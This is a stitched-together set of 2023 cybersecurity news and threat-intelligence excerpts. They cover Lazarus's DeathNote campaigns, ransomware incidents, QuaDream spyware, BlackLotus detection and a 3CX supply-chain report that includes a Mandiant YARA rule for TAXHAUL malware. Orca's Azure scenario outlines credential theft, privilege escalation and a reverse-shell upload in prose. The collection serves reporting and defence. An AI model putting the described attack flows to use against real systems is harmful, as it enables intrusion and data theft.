The threat actors would then attempt to sell the data to other threat actors, who use it for their campaigns, such as phishing attacks, cryptocurrency scams, or distributing malware.In many cases, if data was not sold or some time had passed, the stolen data would be leaked for free on RaidForums to gain reputation among the community.These members were identified by analyzing the seized RaidForums forum database, which would have contained members' email addresses, registration IP addresses, and the IP addresses used when posting and downloading files from the site.This data can then be used to identify members, what country they are located in, and their involvement in the site.The sent emails were titled \"Politiewaarschuwing aan Raidforums gebruikers,\" which translates to \"Police warning to Raidforums users.\"The machine-translated email can be read below in English:\"The Dutch Police and international police organizations have launched an investigation into the website Raidforums.com. This resulted in the police taking the website offline and obtaining a dataset containing the platform's user data. As a result of this investigation, several people have been arrested (see QR code).The investigation has shown that you are linked to a Raidforums user account and that you are active in groups where leaked data is traded. Possession of this is a criminal offence.The police are aware that Raidforums was used to trade leaked data such as pornographic material, personal data and/or account data. Raidforums were also used to gain knowledge for the development of cyber skills that are closely related to committing serious cybercrime crimes.The Dutch Police urges you to stop participating in online activities, such as trading leaked data. You run the risk of breaking the law. Remove pirated software or datasets obtained from Raidforums or other similar sites. Participation in or further continuation of cybercriminal activities may lead to further action against YOU. Illegal activities conducted on Raidforums.com (or on similar websites) can lead to: • Conviction: You will be fined, community service or imprisonment\n • Criminal record: You will get a criminal record. This makes it more difficult to find an internship or a job, but it also makes traveling abroad more difficult. \n • Confiscation: You lose your computer, phone or other electronic devices.The police take firm action against cybercrime, in whatever form.

      "text": " Solutions for:ThreatsCategories12 Apr 2023\n  minute read\t\t\t\t\t\t\t\tTable of ContentsAuthorsTimeline of DeathNote clusterIn this blog, we will provide an overview of the significant modifications that have taken place within this cluster, both in terms of its technical and strategic aspects.The notorious threat actor Lazarus has persistently targeted cryptocurrency-related businesses for a long time. While monitoring the actor’s activities, we noticed that in one particular case they were using a significantly modified piece of malware. In mid-October 2019, we came across a suspicious document uploaded to VirusTotal. Upon further investigation, we discovered that the actor behind this weaponized document had been using similar malicious Word documents since October 2018. The malware author used decoy documents that were related to the cryptocurrency business such as a questionnaire about buying specific cryptocurrency, an introduction to a specific cryptocurrency, and an introduction to a bitcoin mining company.Decoy documentsOnce the victim opens the document and enables the macro, the malicious Visual Basic Script extracts the embedded downloader malware and loads it with specific parameters. In this initial discovery, the actor used two types of second-stage payload. The first is a manipulated piece of software that contains a malicious backdoor, while the second is a typical backdoor with a multi-stage binary infection process.Infection procedureThe Trojanized application utilized in the second stage is masquerading as a genuine UltraVNC viewer. If executed without any command line parameters, it will display a legitimate UltraVNC viewer window. However, it carries out a malicious routine when it is spawned with “-s {F9BK1K0A-KQ9B-2PVH-5YKV-IY2JLT37QQCJ}” parameters. The other infection method executes the installer, which creates and registers an injector and backdoor in a Windows service. Finally, the backdoor is injected into a legitimate process (svchost.exe) and initiates a command-and-control (C2) operation. In this infection, the final payload injected into the legitimate process was Manuscrypt. Until this discovery, the Lazarus group had primarily targeted the cryptocurrency business. Our investigation has identified potential compromises of individuals or companies involved in cryptocurrency in Cyprus, the United States, Taiwan and Hong Kong.While tracking this campaign, we uncovered a significant shift in the attack’s target along with updated infection vectors in April 2020. Our research showed that the DeathNote cluster was used to target the automotive and academic sectors in Eastern Europe, both of which are connected to the defense industry. At this point, the actor switched all the decoy documents to job descriptions related to defense contractors and diplomatic services.Decoy documentsInfection chainVerification process of Trojanized PDF readerFinally, this Trojanized PDF viewer overwrites the original opened file with a decoy PDF file and opens it to deceive the victim while implementing the malware payload. The payload is executed with command line parameters, and a shortcut file is created in the Startup folder to ensure persistence. This infection mechanism demonstrates the care and precision with which the actor delivers the payload.In May 2021, we observed that an IT company in Europe that provides solutions for monitoring network devices and servers was compromised by the same cluster. It’s believed that the Lazarus group had an interest in this company’s widely used software or its supply chain.In addition, in early June 2021, the Lazarus group began utilizing a new infection mechanism against targets in South Korea. One thing that caught our attention was that the initial stage of the malware was executed by legitimate security software that is widely used in South Korea. It’s thought that the malware was spread through a vulnerability in this widely used software in South Korea.Infection chainAlmost one year later, in March 2022, we discovered that the same security program had been exploited to propagate similar downloader malware to several victims in South Korea. However, a different payload was delivered in this case. The C2 operator manually implanted a backdoor twice, and although we were unable to acquire the initially implanted backdoor, we assume it is the same as the backdoor in the following stage. The newly implanted backdoor is capable of executing a retrieved payload with named-pipe communication. In addition, the actor utilized side-loading to execute Mimikatz and used stealer malware to collect keystroke and clipboard data from users.Infection chainAround the same time, we uncovered evidence that one defense contractor in Latin America was compromised by the same backdoor. The initial infection vector was similar to what we’ve seen with other defense industry targets, involving the use of a Trojanized PDF reader with a crafted PDF file. However, in this particular case, the actor adopted a side-loading technique to execute the final payload. When the malicious PDF file is opened with the Trojanized PDF reader, the victim is presented with the same malware mentioned above, which is responsible for collecting and reporting the victim’s information, retrieving commands and executing them using pipe communication mechanisms. The actor used this malware to implant additional payloads, including legitimate files for side-loading purposes.Infection chainDuring our investigation of this campaign, we have gained extensive insight into the Lazarus group’s post-exploitation strategy. After initial infection, the operator executed numerous Windows commands to gather basic system information and attempt to find valuable hosts, such as an Active Directory server. Before moving laterally, the Lazarus group acquired Windows credentials using well-known methods, and employed public techniques, such as ServiceMove. When the group completed its mission and began exfiltrating data, they mostly utilized the WinRAR utility to compress files and transmit them via C2 communication channels.In one case, they accessed the default domain controllers policy directly.Utilizing ADFind tool to acquire Active directory information.After tracking the DeathNote cluster and its origin, we have determined that the Lazarus group is responsible for this malware strain. Our conclusion is supported by many security vendors who also believe that the Lazarus group is linked to this malware. Furthermore, we have analyzed the delivery of Windows commands to the victim through the DeathNote malware, and discovered that a significant number of commands were executed between GMT 00:00 and 07:00. Based on our knowledge of normal working hours, we can infer that the actor is located in either the GMT+08 or GMT+09 time zone.Timeline of Windows commandsMoreover, the actor left a Korean comment ‘정상호출’, which translates to ‘normal call’ in the C2 script. This further supports the hypothesis that Lazarus is a Korean-speaking actor.Korean comment in the C2 scriptIn conclusion, the Lazarus group is a notorious and highly skilled threat actor. Our analysis of the DeathNote cluster reveals a rapid evolution in its tactics, techniques and procedures over the years. As the Lazarus group continues to refine its approaches, it is crucial for organizations to maintain vigilance and take proactive measures to defend against its malicious activities. By staying informed and implementing strong security measures, organizations can reduce the risk of falling victim to this dangerous adversary.AuthorsFollowing the Lazarus group by tracking DeathNote campaignYour email address will not be published.

      "text": " New York’s Suffolk County has concluded an investigation into a destabilizing ransomware attack that forced government workers to rely on fax machines and paper records, discovering stark deficiencies in the county clerk's cybersecurity practices.The BlackCat/AlphV ransomware group took credit for the incident and eventually leaked 400GB of data that was stolen during the attack — including thousands of Social Security numbers.“[The report] describes in great detail the eight months that the criminal actors spent in the clerk's office installing bitcoin mining software, establishing persistence, installing exfiltration tools, creating fake accounts, harvesting credentials and installing remote monitoring tools to establish command and control,” he told reporters.By August, the hackers managed to gain access to a folder with passwords to “highly critical systems that were kept on the clerk's network unprotected.” Within three hours of acquiring that folder, the hackers were eventually able to move into the broader county IT environment.The report pinpoints the acquisition of this password folder as one of the main causes of the attack, since it gave the hackers access to “database systems, servers, phone systems, backup systems, network appliances, file shares, service accounts, critical operational systems, web hosting sites, virus software network monitoring software and more,” Bellone explained.The hackers then spent months laying the groundwork for the attack before exfiltrating troves of data on September 1 and finally deploying the ransomware on September 8. Bellone said the hackers initially demanded $2.5 million in ransom before lowering their demand to about $500,000. No ransom was paid, he added.Despite the longstanding access the BlackCat hackers had, Bellone said the report found that just 1.6% of systems across all county domains were impacted in any way.Bellone went on to criticize the IT department of the clerk’s office, noting that because their office was segregated from the county IT department, it “unfortunately made it easy to withhold information” from other offices.At least one member of the clerk office IT department was placed on administrative leave in December 2022 due to their alleged refusal to cooperate with county investigators and a longstanding refusal to implement cybersecurity mechanisms county-wide, Bellone said.The New York Times obtained emails showing she did ask for a firewall but was rejected by Bellone. Bellone said on Wednesday the investigation proved that her claims were false and that the county had provided her with funding to install a different security system that was never implemented.He added that the county is still working to restore many of the systems that were damaged during the attack, noting that teams from Cisco and Palo Alto Networks are working on the effort. Significant parts of the county network have been back up and running for almost two months, Bellone explained.Jonathan Greig is a Breaking News Reporter at Recorded Future News.

      "text": "  Check Point said the IoT devices attacked by threat actors range from a variety of common IoT devices such as routers, IP cameras, and digital video recorders to network video recorders, and printers. “Cybercriminals are aware that IoT devices are notoriously one of the most vulnerable parts of the network,” said the researchers, who added that most are not properly secured or managed, and many IoT devices have default passwords, all of which combined gives attackers a foothold into corporate networks.The dramatic rise in IoT weekly attacks has been driven by a few factors, including the rise in vulnerabilities in open source software, the long-time IoT devices spend in the supply chain, and poor installation practices where firmware and default passwords are not changed, said Bud Broomhead, chief executive officer at Viakoo.“Education as the most impacted vertical makes sense, as the variety, age and cyber hygiene of IoT devices in education would make them more exploitable,” said Broomhead. ”However, all verticals should be concerned about these findings and ensure that IoT devices are installed and maintained with current firmware, strong passwords, and certificates. Organizations that do not already include IoT devices in their overall security posture and governance should make it an urgent priority, especially given the growth shown in this study.”Mike Parkin, senior technical engineer at Vulcan Cyber, added that IoT devices are often overlooked as a threat surface in many environments. Parkin said they are often  especially difficult, if not impossible, to patch, which makes them significantly harder to secure when exposed. “Even devices without a lot of computing power can be inviting targets, as they can make useful springboards into the rest of the environment,” said Parkin. “Organizations need to be aware of the IoT devices in their environments and make sure they're deployed and secured correctly, and kept up-to- date on security patches when they're available. They may seem harmless, but they can't be ignored.”It’s clear iLeakage presents itself as a major flaw with no known mitigation and it’s a real problem for iOS devices – here are some ideas on how to respond.

      "text": " An operation within North Korea's notorious Lazarus Group that initially focused solely on coin-mining attacks has begun targeting defense sector organizations around the world.The DeathNote cluster's shift in focus began in 2020 with attacks on automotive and academic organizations in Eastern Europe linked to the defense industry. Researchers from Kaspersky that have been tracking DeathNote's activities found the Lazarus subgroup following up on that attack with subsequent campaigns on defense and defense-related companies in Europe, Latin America, Africa, and South Korea.Kaspersky's analysis of the attack showed the malware using numerous legitimate Windows commands and tools such as Mimikatz for everything from initial reconnaissance on a compromised host system and acquiring login credentials, to lateral movement and exfiltration. To acquire basic system info, for instance, the malware used Windows commands to find TCP and system info, or to query the saved server list from the registry.To move laterally, the actor used a technique called ServiceMove which leverages Windows Perception Simulation Service to load arbitrary DLL files, Kaspersky said. \"When the group completed its mission and began exfiltrating data, they mostly utilized the WinRAR utility to compress files and transmit them via C2 communication channels.\"The tactics, techniques, and procedures (TTPs) that DeathNote employed in its campaign against the defense contractor in Africa were similar to those that Kaspersky observed in another 2022 campaign that hit a defense company in Latin America.Kaspersky security researcher Seongsu Park says DeathNote's evolution from cryptocurrency mining attacks to defense sector espionage is consistent with the Lazarus Group's efforts to broaden its target list over the years.The DeathNote cluster is just one of at least seven separate Lazarus malware clusters that are currently active. The others, according to Kaspersky, are ThreatNeedle, Bookcode, AppleJeus, Mata, CookieTime, and Manuscrypt. The Lazarus group operates several clusters simultaneously and each of these clusters operates in a sophisticated manner, using its own malware toolkit with sometimes overlapping features, Park says.\"Each of their clusters changes targets from time to time,\" Park notes. \"We have observed that other clusters, for example, CookieTime and Bookcode, belonging to the Lazarus group, have also targeted the defense industry before.\"DeathNote's typical TTPs have included using spear-phishing emails with weaponized Word or PDF reader apps. During the days when the cluster focused on coin mining, it used cryptocurrency-themed lures to try and get victims to execute the initial infection vector. Since switching to defense targets, the cluster has been using defense themed lures — including those that purport to be job advertisements — as phishing lures. Kaspersky said it found DeathNote only dropping the second-stage payload on systems belonging to victims it deemed valuable from a cyberespionage standpoint.For the moment at least DeathNote's campaigns targeting the defense sector have not affected US organizations.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " A design flaw in Microsoft Azure – that shared key authorization is enabled by default when creating storage accounts – could give attackers full access to your environment, according to Orca Security researchers.However, after further investigation, the Microsoft Security Response Center \"determined it was not a security issue.\" That said, the Windows giant acknowledged the issue \"warranted discussion and improvement to help customers more effectively deploy environments with least privilege and defense-in-depth to be more resilient against attackers.\"Additionally, at some later date, Redmond says new storage accounts will have shared key and shared access signature authorization disabled by default, but there's no word on when that will happen.The issue here is that the Microsoft.Storage/storageAccounts/listKeys/action permission enables full operations on data. While customers may grant this permission to users within their organization who need read-only access to data, it also allows the data to be manipulated or even deleted. This, on its own, presents a data security risk to organizations, but Nisimi explains that overly permissive storage account keys can also be abused to move laterally inside the cloud environment.As both Nisimi and Microsoft note, there's a connection between Azure Storage and Azure Functions, which is the cloud provider's serverless service. When a developer deploys a Function App, this action creates a dedicated storage account that hosts all functions' source code. As Nisimi explains:The storage account of a Function App can be found inside the AzureWebJobStorage environment variable under Application Settings, which includes a connection string to the storage account, together with one of the storage account keys.In Orca's attack scenario, a fictional employee, Chris Green, is assigned a storage account contributor role. If his account is compromised, attackers can manipulate storage account data.From here, however, it's also possible to compromise a Function App provided the attacker can filter out all function-related storage accounts (and their related file shares with source code) and from that list determine the functions' objectives. For this example, Orca selects a storage account named \"monitorvms98d0,\" because the name suggests it has to do with monitoring virtual machines (VMs). After downloading the code file, the attacker can see that the managed identity assigned to this Function App can execute a command under the Azure Resource Manager Provider.\"At this point stealing credentials and Escalating Privileges, as scary as it may sound, is fairly easy,\" Nisimi said. \"Once an attacker locates the Storage Account of a Function App that is assigned with a strong managed identity, it can run code on its behalf and as a result acquire a subscription privilege escalation (PE).\"After obtaining a managed-identity access token, Orca's fictional attacker uses an API call to list all the VMs in the subscription, finds a promising VM labeled \"CustomersDB,\" uploads a reverse shell to the VM and then sets write permissions to the VM, which the attacker now effectively owns.\"This attack-flow scenario is possible if an AD User with listKeys permissions is being compromised (as in our example), but also if storage accounts' connection-strings/access-keys are leaked,\" Nisimi wrote. \"By overriding function files in storage accounts, an attacker can steal and exfiltrate a higher-privileged identity and use it to move laterally, exploit and compromise victims' most valuable crown jewels.\"For its part, Microsoft says Orca's research \"highlighted opportunities for us to continue to improve to help customers correctly configure their environments with least privilege.\"The Register   Biting the hand that feeds IT\n                        Copyright.

The downside is that it also allows attackers to create high-performance botnets that can be as much as 5,000x stronger.\"Cloudflare has been working with key cloud computing providers and partners to crack down on these emerging VPS-based threats and says it has succeeded in taking down substantial portions of these novel botnets.In general, Cloudflare reports steady DDoS activity in the first quarter of the year, with a notable 60% YoY increase in the ransom DDoS attacks, representing 16% of all recorded/reported DDoS attacks.These extortion-based DDoS attacks cause service outages to the target by bombarding them with garbage traffic and continue indefinitely until the victim meets the attacker's demands.The most targeted country by DDoS attacks in general during Q1 '23 was Israel, followed by the United States, Canada, and Turkey. Internet services, marketing, software, and gaming/gambling were the most targeted sectors.The most significant attack seen by Cloudflare this quarter peaked above 71 million requests per second. Another notable incident was a 1.3 terabits per second DDoS attack targeting a telecommunications service provider in South America.In terms of the size and duration of the attacks, most of them (86.6%) lasted for under 10 minutes, while 91% did not exceed 500 Mbps.However, the number of larger attacks is still growing, with attacks surpassing 100 Gbps, recording a rise of about 6.5% compared to the previous quarter.DDoS attacks can manifest in many ways, and as defenses evolve to address them, attackers may devise new methods or return to old tactics that newer protection systems may not prioritize anymore.In this quarter, Cloudflare recorded the following emerging trends:DDoS attacks in Q1 2023 show a trend of increasing in size and duration, targeting a broad range of industries. Therefore, effective defense strategies require automated detection and mitigation solutions."

They don't directly target individuals or run cyber espionage operations themselves.Microsoft and its partners analyzed samples of the multi-component KingsPawn, which specifically targets iOS 14. However, it's possible that some of the code also could be used on Android devices, the researchers said. It's also likely that the threat group has already updated the malware to target versions of iOS newer than 14, as the latest version of Apple's operating system software is already up to iOS 16, the researchers said.The monitor agent is responsible for reducing the forensic footprint of the malware to prevent detection and hinder investigations, as well as manage the various processes and threads spawned on behalf of the malware to avoid artifacts created from unexpected process crashes.Within the main agent of KingsPawn is the real gravy of the spyware where all of the capabilities to track victims and steal data lies, the researchers said.Capabilities of the main agent include: obtaining device, Wi-Fi, cellular info, searching for and retrieving files, using the camera in the background, locating where the device is, monitoring phone calls, accessing the iOS keychain for passwords, and generating an iCloud one-time password that's time sensitive to retrieve stored data.\"The agent also creates a secure channel for XPC messaging by creating a nested app extension called fud.appex,\" the researchers wrote. \"XPC messaging allows the agent to query various system binaries for sensitive device information, such as location details.\"Microsoft has developed unique network detections that could be used to fingerprint DEV-019's infrastructure on the Internet based on the group's heavy use of domain registrars and inexpensive cloud hosting providers that accept cryptocurrency as payment, the researchers said.\"They tended to only use a single domain per IP address and domains were very rarely reused across multiple IP addresses,\" they wrote in the post. \"Many of the observed domains were deployed using free Let's Encrypt SSL certificates, while others used self-signed certificates designed to blend in with normal Kubernetes deployments.\"The blog post includes network-based indicators that the researchers gleaned from their investigation to help potential victims identify if they've been compromised, including domains strongly associated with some countries that Citizen Lab has identified as locations of victims, countries where QuaDream platforms were operating, or both.While acknowledging that preventing exploitation of mobile devices by threat actors who are exploiting zero-click vulnerabilities is difficult, there are ways to minimize the risk of mobile devices being compromised, the researchers said.Following basic cyber hygiene and best practices to keep device software updated through automatic updates, the use of anti-malware software, and maintaining vigilance not to click on malicious links or suspicious messages can also help potential victims avoid compromise.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Microsoft has shared guidance to help organizations check if hackers targeted or compromised machines with the BlackLotus UEFI bootkit by exploiting the CVE-2022-21894 vulnerability.Organizations and individuals can also use Microsoft’s advice to recover from an attack and to prevent threat actors using BlackLotus from achieving persistence and evading detection.Malware for the Unified Extensible Firmware Interface (UEFI) is particularly challenging to detect as these threats run before the operating system, being capable to deploy payloads early on in the boot process to disable security mechanisms.Analyzing devices compromised with BlackLotus, the Microsoft Incident Response team identified several points in the malware installation and execution process that allow its detection.The researchers note that defenders can look for the following artifacts to determine a BlackLotus UEFI bootkit infection:Since BlackLotus needs to write malicious bootloader files to the EFI system partition, also referred to as ESP, it will lock them to prevent their deletion or modification.For instance, if the G: drive letter is free, you can execute this command:If the modification time does not look suspicious, threat hunters can try to calculate the hash of the bootloader file. On a compromised device the output should be a file access error because BlackLotus locks them to prevent their tampering.Another tell of BlackLotus is the presence of the “/system32/” directory on the ESP, which is the storage location for the files required to install the UEFI malware.Microsoft says that successful installation of BlackLotus results in deleting the files inside “ESP:/system32/” but the directory remains. Forensic analysts can use this to search for the removed files.One of the BlackLotus capabilities is to disable the hypervisor-protected code integrity (HVCI), which allows it to load unsigned kernel code.A second safety feature that BlackLotus disables is Microsoft Defender Antivirus, the default security agent on the Windows operating system.This action may leave traces in the Windows Event Logs in the form of an entry under the Microsoft-Windows-Windows Defender/Operational Log.Turning off Defender may also generate an Event ID 7023 in the System event log as a result of the service stopping unexpectedly.Microsoft investigators advise threat hunters to examine network logs for outbound connections from winlogon.exe on port 80, which may be indicative of BlackLotus trying to communicate with its command and control (C2) server.Additional evidence of BlackLotus compromise can be present in the boot configuration logs - MeasuredBoot logs, that provide details about the Windows boot process.When the bootkit becomes active, two boot drivers become available, specifically grubx64.efi and winload.efi. By comparing the logs for each reboot of the system, analysts can find the components that have been added or removed from each machine boot.Microsoft warns that accessing the MeasuredBoot log files is possible using a forensic image or raw NTFS reading tool.Below is an example of the BlackLotus drivers the sample script showed on an infected machine:Cleaning a machine after a BlackLotus infection requires removing it from the network and reinstalling it with a clean operating system and EFI partition, or restoring from a clean backup with an EFI partition.While the post-infection artifacts are revealing in determining the type of malware used, defenders can prevent the compromise by detecting an intrusion before the adversary can deploy UEFI malware.Launching a UEFI bootkit, though, requires privileged access to the target machine, either remote or physical, meaning that a first-stage threat and an initial access vector precede the persistent infection.To fend off an infection via BlackLotus or other malware exploiting CVE-2022-21894, Microsoft recommends organizations practice the principle of least privilege and credential hygiene.“Avoid the use of domain-wide, admin-level service accounts. Restricting local administrative privileges can help limit installation of remote access trojans (RATs) and other unwanted applications” - MicrosoftBy implementing multiple layers of security controls, the so-called defense in-depth strategies, organizations can reduce the risk of an adversary gaining access or administrative privilege in the environment.This can essentially stop a BlackLotus attack in its earlier stages before the threat actor can compromise a user or service account credentials to move laterally on the network and escalate their privileges."

      "text": " Following the appointment of Mandiant as our security incident response team, forensic analysis on our network and product is in progress. In a nutshell, the interim assessment concluded:Based on the Mandiant investigation into the 3CX intrusion and supply chain attack thus far, they attribute the activity to a cluster named UNC4736. Mandiant assesses with high confidence that UNC4736 has a North Korean nexus.Mandiant determined that the attacker infected targeted 3CX systems with TAXHAUL (AKA “TxRLoader”) malware. When executed on Windows systems, TAXHAUL decrypts and executes shellcode located in a file named <machine hardware profile GUID>.TxR.0.regtrans-ms located in the directory C:\\Windows\\System32\\config\\TxR\\. The attacker likely chose this file name and location to attempt to blend into standard Windows installations. The malware uses the Windows CryptUnprotectData API to decrypt the shellcode with a cryptographic key that is unique to each compromised host, which means the data can only be decrypted on the infected system. The attacker likely made this design decision to increase the cost and effort of successful analysis by security researchers and incident responders.The following YARA rule can be used to hunt for TAXHAUL (TxRLoader):rule TAXHAUL\n{\nmeta:\nauthor = \"Mandiant\"\ncreated = \"04/03/2023\"\nmodified = \"04/03/2023\"\nversion = \"1.0\"\nstrings:\n$p00_0 = {410f45fe4c8d3d[4]eb??4533f64c8d3d[4]eb??4533f64c8d3d[4]eb}\n$p00_1 = {4d3926488b01400f94c6ff90[4]41b9[4]eb??8bde4885c074}\ncondition:\nuint16(0) == 0x5A4D and any of them\n}Please note that in a similar way to any YARA rule, this should be properly assessed within a test environment first before usage in production. This also comes with no guarantees regarding false positive rates, as well as coverage for this entire malware family and eventual variants.Mandiant also identified a MacOS backdoor, currently named SIMPLESEA, located at /Library/Graphics/Quartz (MD5: d9d19abffc2c7dac11a16745f4aea44f). Mandiant is still analysing SIMPLESEA to determine if it overlaps with another known malware family.*The backdoor written in C communicates via HTTP. Supported backdoor commands include shell command execution, file transfer, file execution, file management, and configuration updating. It can also be tasked to test the connectivity of a provided IP and port number.The backdoor checks for the existence of its configuration file at /private/etc/apdl.cf. If it does not exist, it creates it with hard-coded values. The config file is single-byte XOR encoded with the key 0x5e. C2 comms are sent over HTTP requests. A bot id is generated randomly seeded with the PID of the malware upon initial execution. The id is sent with C2 communications. A brief host survey report is included in beacon requests. Message contents are encrypted with the A5 stream cipher according to the function names in the binary.* Previous reporting mentioned the macOS build server was compromised with SIMPLESEA. Mandiant Intelligence analyzed the sample and determined it to have a high degree of code overlap with POOLRAT, deprecating SIMPLESEA in favor of POOLRAT.On Windows, the attacker used DLL side-loading to achieve persistence for TAXHAUL malware. DLL side-loading triggered infected systems to execute the attacker's malware within the context of legitimate Microsoft Windows binaries, reducing the likelihood of malware detection. The persistence mechanism also ensures the attacker malware is loaded at system start-up, enabling the attacker to retain remote access to the infected system over the internet.The malware was named C:\\Windows\\system32\\wlbsctrl.dll to mimic the legitimate Windows binary of the same name. The DLL was loaded by the legitimate Windows service IKEEXT through the legitimate Windows binary svchost.exe.Mandiant identified that malware within the 3CX environment made use of the following command and control infrastructure:Subscribe to our Product News:Trusted by 350,000+ companiesThe #1 Communications System!12,000,000+ users everyday"

Each wave uses a new, freshly registered domain name that combine random English words together, such as sometimesfree[.]biz, and destinyfernandi[.]com. \"The entire time, Balada Injector has been quickly adding newly disclosed vulnerabilities (and sometimes undisclosed 0-days), occasionally starting massive waves of infections within a few hours after vulnerability disclosed,\" Sinegubko wrote.  \"Older vulnerabilities were not immediately discarded after initial rounds of infections and some of them remained in use for a long time after the patches were released.\"  Post-infection activity  Balada's scripts aim to steal database credentials in wp-config.php files, something that could allow continued access even if the site owner patches previously exploited vulnerabilities and removes the backdoor files.

      "text": "  Malicious Google Play apps are sold for up to $20,000 on underground online marketplaces, with cryptocurrency trackers, financial apps, QR-code scanners, and dating apps being the most targeted application categories to hide malware, according to new research from antivirus firm Kaspersky.  (Photo by Jaap Arriens/NurPhoto via Getty Images)The findings come after the Russian-based multinational firm analyzed offers of malicious apps for sale on nine popular darknet marketplaces between 2019 and 2023, identifying new details about how these malicious programs evade the security of tech giants and poison the Play Store. Like legitimate marketplaces, darknet forums offer a variety of products to fulfill the needs and budgets of different customers. Obtaining a Google Play account can be bought cheaply for $60 to $200, and various types of malicious loaders can be sold for prices ranging between $2,000 and $20,000, depending on the functions and complexity. On average, the price for a loader is $6,975, but it can reach even higher if buyers want the loader source code, according to Kaspersky.  Alisa Kulishenko, a security researcher at Kaspersky, said these loaders - used to inject malicious or unwanted code into the app - are the most popular Play Store threats offered on underground forums.  \"Among the loader features, their authors may highlight the user-friendly UI design, convenient control panel, victim country filter, support for the latest Android versions, and more,\" said Kulishenko, adding that cybercriminals sometimes provide video demonstrations or demo versions to potential customers, while also offering additional trojanized apps to detect debugger or sandbox environments.  \"If a suspicious environment is detected, the loader may stop its operations, or notify the cybercriminal that it has likely been discovered by security investigators.\"  For buyers with limited budgets, these marketplaces also offer cheaper binding services for $50 to $100 or $65 per file. Similar to loaders, they are also designed to hide malicious or unwanted APK files in legitimate apps, but because their malicious code is not customized for Android applications, they are more likely to be detected by Play Store security checks and results in a lower successful installation rate.  Besides Google Play loaders and binding services, other services include malware obfuscation which helps buyers better bypass security checks by complicating malicious code, and installation services to increase the number of downloads. Darknet sellers also provide additional services to help buyers publish malicious apps so that buyers do not need to spend time interacting with the Play Store directly.  Kulishenko said sellers accept payment through a number of novel methods. \"The services can be provided for a share of the final profit, rented, or sold for a one-time price. Some sellers also hold auctions of their goods: since the number of items sold is limited, they are not very likely to be discovered, so buyers may be willing to compete for them,\" she explained.  \"The quality of cybersecurity solutions that protect users from these attacks is increasing. On [these marketplaces], we found messages from cybercriminals complaining how it is now much harder for them to upload their malicious apps to official stores. However, this also means that they will now come up with much more sophisticated circumvention schemes, so users should stay alert and carefully check which apps they are downloading,\" Kulishenko said. Menghan Xiao is a cybersecurity reporter at SC Media, covering software supply chain security, workforce/business, and threat intelligence.

      "text": " A secretive Israeli spyware company’s software has been used on journalists, political figures and a civil-society worker on three continents, researchers have found.The company reportedly markets a surveillance platform called Reign to governments. Microsoft described it as “a suite of exploits, malware, and infrastructure designed to exfiltrate data from mobile devices.” Likely to evade export controls and oversight, the company sells its products outside of Israel through a Cyprus-based entity called InReach.“QuaDream operates with a minimal public presence, lacking a website, extensive media coverage, or social media presence,” Citizen Lab wrote. “QuaDream employees have reportedly been instructed to refrain from mentioning their employer on social media.”Microsoft researchers were able to detect two samples on iOS devices of the spyware, which they dubbed KingsPawn and attributed to QuaDream with high confidence. They shared the samples with Citizen Lab, who used them to detect the company’s spyware targeting five victims in North America, Europe, Central Asia, Southeast Asia and the Middle East. Citizen Lab also determined that “QuaDream systems,” including servers for receiving data and deploying exploits, operated from Bulgaria, Czech Republic, Hungary, Ghana, Israel, Mexico, Romania, Singapore, United Arab Emirates and Uzbekistan.Citizen Lab also identified traces of a zero-click exploit they believe was used to deploy the spyware on iOS versions 14.4 and 14.4.2. The exploit uses calendar invitations that are invisible to the account owner and, after deployment, the spyware attempts to cover its tracks to prevent detection. Zero-click exploits infect a device without any activity by the user.The researchers found that one of the samples discovered by Microsoft opened the door for an array of surveillance activities, including location tracking, the use of a device’s camera and file access.“Like other, similar, mercenary spyware the implant has a range of capabilities from hot-mic audio recording of calls and the environment, to more advanced capabilities to search through the phone,” Citizen Lab wrote.QuaDream — whose three founders include a former Israeli military official and two former employees of the prominent spyware company NSO Group — has remained out of the limelight until recently.“This network engaged in a … testing activity between their own fake accounts, targeting Android and iOS devices in what we assess to be an attempt to test capabilities to exfiltrate various types of data including messages, images, video and audio files, and geolocation,” Meta wrote.James Reddick has worked as a journalist around the world, including in Lebanon and in Cambodia, where he was Deputy Managing Editor of The Phnom Penh Post.

      "text": " Microsoft's Patch Tuesday security update for April 2023 contains patches for 97 CVEs, including one zero-day bug under active exploit in ransomware attacks, another that's a reissue of a fix for a flaw from 2013 that a threat actor recently exploited in a supply chain attack on 3CX, and a wormable bug rated critical in severity.Microsoft identified a total of seven of the bugs it fixed this month as being of critical severity, which typically means organizations need to make them a top priority from a patch implementation standpoint.Nearly half, or 45, of the vulnerabilities in the April update enable remote code execution (RCE), a significant uptick from the average of 33 RCE bugs that Microsoft has reported in each of the previous three months. Even so, the company rated nearly 90% of the CVEs in the latest batch as bugs that cyberattackers are less likely to exploit — just 9% are characterized as flaws that threat actors are more likely to exploit.\"This vulnerability leverages existing system access to actively exploit a device and is a result of how the CLFS driver interacts with objects in memory on a system,\" said Gina Geisel, a security researcher at Automox. To exploit the flaw, an attacker would need to log in to a system and then execute a malicious binary to elevate privileges. \"Automox recommends patch deployment within 24 hours since this is an actively exploited zero-day,\" Geisel said in emailed comments to Dark Reading.\"The exploit was highly obfuscated with more than 80% of its code being 'junk' elegantly compiled into the binary,\" according to the analysis. Kaspersky researchers said they reported the bug to Microsoft after observing an adversary using it in ransomware attacks in February.When Microsoft released the patch in 2013, the company had decided to make it an opt-in patch because of the potential for the fix to cause problems for some organizations. With the April security update, Microsoft has made the fix available for more platforms and provide more recommendations for organizations on how to address the issue. The bug affects Microsoft Message Queuing (MSMQ) technology and gives attackers a way to gain RCE by sending a specially crafted MSMQ packet to a MSMQ server. The vulnerability affects Windows 10, 11, and Server 2008-2022 systems that have the message queuing feature enabled on their systems, Automox researcher Peter Pflaster said in emailed comments. Administrators should consider applying Microsoft patch for the issue ASAP, since the company has noted that threat actors are more likely to exploit the vulnerability.\"This patch Tuesday MSFT fixed some critical flaws, of which we would recommend organizations to prioritize patching vulnerabilities those that are actively being exploited and wormable,\" said Bharat Jogi, director of vulnerability and threat Research, at Qualys.\"Microsoft recommends that DHCP services are not installed on Domain Controllers, however, smaller organizations will commonly see DC and DHCP services co-located. In this instance the impact could be a lot higher,\" Breen warned in emailed comments. Attackers that have control over DHCP servers could wreak considerable havoc on the network including stealing credentials for software-as-a-service (SaaS) products, or to carry out machine-in-the-middle (MITM) attacks, he noted.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England 